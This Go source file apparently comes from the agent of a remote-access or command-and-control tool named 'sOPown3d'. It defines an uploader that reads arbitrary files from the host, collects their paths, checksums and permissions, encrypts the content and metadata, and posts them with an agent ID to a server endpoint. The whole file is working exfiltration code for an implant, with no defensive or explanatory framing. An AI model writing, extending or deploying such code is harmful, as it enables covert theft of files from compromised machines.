package transfer

import (
  "bytes"
  "crypto/sha256"
  "encoding/base64"
  "encoding/hex"
  "encoding/json"
  "fmt"
  "io"
  "mime/multipart"
  "net/http"
  "os"
  "path/filepath"
  "sOPown3d/internal/agent/crypto"
  "time"
)

type FileMetadata struct {
  AgentID      string `json:"agent_id"`
  OriginalPath string `json:"original_path"`
  Filename     string `json:"filename"`
  Size         int64  `json:"size"`
  Checksum     string `json:"checksum"`
  ModTime      int64  `json:"mod_time"`
  Permissions  string `json:"permissions"`
}

type Uploader struct {
  serverURL string
  client    *http.Client
  agentID   string
}

func NewUploader(serverURL, agentID string) *Uploader {
  return &Uploader{
    serverURL: serverURL,
    agentID:   agentID,
    client:    &http.Client{Timeout: 5 * time.Minute},
  }
}

func (u *Uploader) UploadFile(filePath string) error {
  // Read file
  fileData, err := os.ReadFile(filePath)
  if err != nil {
    return fmt.Errorf("failed to read file: %w", err)
  }

  // Calculate checksum BEFORE encryption
  hash := sha256.Sum256(fileData)
  checksum := hex.EncodeToString(hash[:])

  // Get file info
  info, err := os.Stat(filePath)
  if err != nil {
    return fmt.Errorf("failed to stat file: %w", err)
  }

  // Create metadata
  metadata := FileMetadata{
    AgentID:      u.agentID,
    OriginalPath: filePath,
    Filename:     filepath.Base(filePath),
    Size:         info.Size(),
    Checksum:     checksum,
    ModTime:      info.ModTime().Unix(),
    Permissions:  info.Mode().String(),
  }

  // Encrypt file content (convert bytes to string for your Encrypt function)
  fileB64 := base64.StdEncoding.EncodeToString(fileData)
  encryptedFile, err := crypto.Encrypt(fileB64)
  if err != nil {
    return fmt.Errorf("failed to encrypt file: %w", err)
  }

  // Encrypt metadata
  metadataJSON, _ := json.Marshal(metadata)
  encryptedMetadata, err := crypto.Encrypt(string(metadataJSON))
  if err != nil {
    return fmt.Errorf("failed to encrypt metadata: %w", err)
  }
  // ================================

  // Create multipart form
  body := &bytes.Buffer{}
  writer := multipart.NewWriter(body)

  // Add encrypted metadata as form field
  writer.WriteField("metadata", encryptedMetadata)

  // Add encrypted file as form field (not file part, since it's encrypted string)
  writer.WriteField("file", encryptedFile)
  writer.WriteField("filename", metadata.Filename)

  writer.Close()

  // Send to server
  req, err := http.NewRequest("POST", u.serverURL+"/api/files/upload", body)
  if err != nil {
    return fmt.Errorf("failed to create request: %w", err)
  }

  req.Header.Set("Content-Type", writer.FormDataContentType())
  req.Header.Set("X-Agent-ID", u.agentID)

  resp, err := u.client.Do(req)
  if err != nil {
    return fmt.Errorf("failed to send request: %w", err)
  }
  defer resp.Body.Close()

  if resp.StatusCode != http.StatusOK {
    bodyBytes, _ := io.ReadAll(resp.Body)
    return fmt.Errorf("upload failed with status %d: %s", resp.StatusCode, string(bodyBytes))
  }

  return nil
}

func (u *Uploader) UploadFiles(filePaths []string) map[string]error {
  errors := make(map[string]error)

  for _, path := range filePaths {
    if err := u.UploadFile(path); err != nil {
      errors[path] = err
    }
  }

  return errors
}
